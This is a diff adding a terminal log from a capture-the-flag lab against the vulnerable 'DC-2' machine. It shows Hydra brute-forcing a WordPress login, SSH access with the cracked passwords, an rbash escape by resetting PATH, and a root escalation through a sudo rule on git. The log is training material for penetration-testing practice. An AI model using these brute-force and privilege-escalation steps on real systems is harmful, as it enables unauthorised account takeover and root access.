@@ -172,3 +172,145 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:
 [80][http-post-form] host: dc-2   login: tom   password: parturient
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
+
+┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
+└──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:07
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 495 login tries (l:3/p:165), ~31 tries per task
+[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect
+[80][http-post-form] host: dc-2   login: jerry   password: adipiscing
+[STATUS] 421.00 tries/min, 421 tries in 00:01h, 74 to do in 00:01h, 16 active
+[80][http-post-form] host: dc-2   login: tom   password: parturient
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 14:26:18
+
+┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
+└──╼ $ssh jerry@$IP -p 7744 
+jerry@192.168.56.110's password: 
+Permission denied, please try again.
+
+┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
+└──╼ $ssh tom@$IP -p 7744
+tom@192.168.56.110's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+tom@DC-2:~$ 
+
+tom@DC-2:~$ whoami
+-rbash: whoami: command not found
+tom@DC-2:~$ id
+-rbash: id: command not found
+
+tom@DC-2:~$ pwd
+/home/tom
+tom@DC-2:~$ ls -la
+total 40
+drwxr-x--- 3 tom  tom  4096 Mar 21  2019 .
+drwxr-xr-x 4 root root 4096 Mar 21  2019 ..
+-rwxr-x--- 1 tom  tom    66 Mar 21  2019 .bash_history
+-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login
+-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout
+-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile
+-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc
+-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt
+-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile
+drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr
+
+tom@DC-2:~$ cat flag3.txt
+-rbash: cat: command not found
+
+tom@DC-2:~$ ls /home/tom/usr/bin
+less  ls  scp  vi
+
+Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+
+tom@DC-2:~$ echo $SHELL
+/bin/rbash
+tom@DC-2:~$ echo $0
+/bin/bash
+
+tom@DC-2:~$ export PATH=/bin:/usr/bin:/sbin:/usr/sbin:$PATH
+
+tom@DC-2:~$ su jerry
+Password: 
+
+jerry@DC-2:/home/tom$ ls -la
+ls: cannot open directory .: Permission denied
+jerry@DC-2:/home/tom$ whoami
+jerry
+jerry@DC-2:/home/tom$ id
+uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)
+jerry@DC-2:/home/tom$ cd
+
+jerry@DC-2:~$ ls -la
+total 28
+drwxr-xr-x 2 jerry jerry 4096 Mar 21  2019 .
+drwxr-xr-x 4 root  root  4096 Mar 21  2019 ..
+-rw------- 1 jerry jerry  109 Mar 21  2019 .bash_history
+-rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout
+-rw-r--r-- 1 jerry jerry 3515 Mar 21  2019 .bashrc
+-rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt
+-rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile
+jerry@DC-2:~$ cat flag4.txt
+Good to see that you've made it this far - but you're not home yet. 
+
+You still need to get the final flag (the only flag that really counts!!!).  
+
+No hints here - you're on your own now.  :-)
+
+Go on - git outta here!!!!
+
+jerry@DC-2:~$ sudo -l
+Matching Defaults entries for jerry on DC-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+
+jerry@DC-2:~$ sudo git -p help config
+
+       Multiple lines can be added to an option by using the --add
+       option. If you want to update or unset an option which can occur
+       on multiple lines, a POSIX regexp value_regex needs to be given.
+       Only the existing values that match the regexp are updated or
+       unset. If you want to handle the lines that do not match the
+!/bin/bash
+root@DC-2:/home/jerry# 
+root@DC-2:/home/jerry# whoami
+root
+root@DC-2:/home/jerry# id
+uid=0(root) gid=0(root) groups=0(root)
+root@DC-2:/home/jerry# cd /root
+root@DC-2:~# ls -la
+total 32
+drwx------  2 root root 4096 Mar 21  2019 .
+drwxr-xr-x 21 root root 4096 Mar 10  2019 ..
+-rw-------  1 root root  207 Mar 21  2019 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt
+-rw-------  1 root root   46 Mar 21  2019 .lesshst
+-rw-------  1 root root  232 Mar 21  2019 .mysql_history
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+root@DC-2:~# cat final-flag.txt
+ __    __     _ _       _                    _ 
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
